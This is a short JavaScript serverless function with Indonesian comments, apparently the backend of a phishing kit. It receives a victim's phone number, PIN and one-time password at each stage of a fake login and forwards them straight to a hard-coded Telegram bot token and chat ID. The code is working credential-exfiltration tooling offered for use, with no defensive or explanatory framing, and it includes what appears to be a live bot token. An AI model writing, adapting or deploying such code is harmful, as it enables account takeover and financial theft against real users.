exports.handler = async (event) => {
    // Pastikan hanya menerima permintaan POST
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    try {
        const data = JSON.parse(event.body);
        
        // GANTI TOKEN DAN CHAT ID DI BAWAH INI
        const token = "8652214007:AAHt0TuC4p88mmxdMWzkp5VeeGEcU34mGck";
        const chatId = "7414298016";
        
        // Pesan akan berubah otomatis sesuai tahapannya
        const text = `⚠️ AKTIVITAS BARU: ${data.tahap}\n\n` +
                     `📱 Nomor: ${data.nomor || '-'}\n` +
                     `🔑 PIN: ${data.pin || '-'}\n` +
                     `🔢 OTP: ${data.otp || '-'}`;
        
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;

        // Kirim permintaan ke Telegram
        await fetch(url);

        return {
            statusCode: 200,
            body: JSON.stringify({ message: "Sukses terkirim" })
        };
    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ message: "Gagal mengirim" })
        };
    }
};
